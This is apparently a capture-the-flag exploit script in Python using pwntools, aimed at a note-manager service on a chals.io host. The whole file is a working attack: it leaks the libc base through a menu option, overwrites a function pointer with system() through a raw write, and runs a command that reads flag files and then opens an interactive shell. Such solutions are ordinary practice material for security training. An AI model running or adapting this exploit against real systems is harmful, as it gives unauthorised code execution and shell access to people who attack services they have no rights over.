from pwn import *
import re
import time


HOST = "0.cloud.chals.io"
PORT = 26716
SYSTEM_OFF = 0x50D70


def menu(io, choice):
    io.sendline(str(choice).encode())


def leak_libc(io):
    menu(io, 5)
    io.sendlineafter(b"note id containing /proc data: ", b"0")
    data = io.recvuntil(b"> ")
    match = re.search(rb"\[LEAK\] libc base: 0x([0-9a-f]+)", data)
    if not match:
        raise ValueError("failed to leak libc base")
    return int(match.group(1), 16)


def create_note(io, idx, content=b"AAAA"):
    menu(io, 1)
    io.sendlineafter(b"id (0-15): ", str(idx).encode())
    io.sendlineafter(b"content: ", content)
    io.recvuntil(b"> ")


def raw_write(io, idx, payload):
    menu(io, 8)
    io.sendlineafter(b"id: ", str(idx).encode())

    # The binary mixes scanf/fgets with a raw read(0, ...), so give it a
    # moment to enter the blocking read before sending the binary payload.
    time.sleep(0.3)
    io.send(payload)
    io.recvuntil(b"> ")


def trigger(io, idx):
    menu(io, 3)
    io.sendlineafter(b"id: ", str(idx).encode())


def main():
    context.log_level = "info"
    io = remote(HOST, PORT)
    io.recvuntil(b"> ")

    libc_base = leak_libc(io)
    system = libc_base + SYSTEM_OFF
    log.info(f"libc base = {libc_base:#x}")
    log.info(f"system    = {system:#x}")

    create_note(io, 0)

    cmd = (
        b"sh -c 'cat /flag* /challenge/flag* /home/*/flag* 2>/dev/null; "
        b"exec /bin/sh'\x00"
    )
    payload = cmd.ljust(0x200, b"\x00")
    payload += p64(system)
    payload += p32(0)
    payload += p32(1)

    raw_write(io, 0, payload)
    trigger(io, 0)
    io.interactive()


if __name__ == "__main__":
    main()
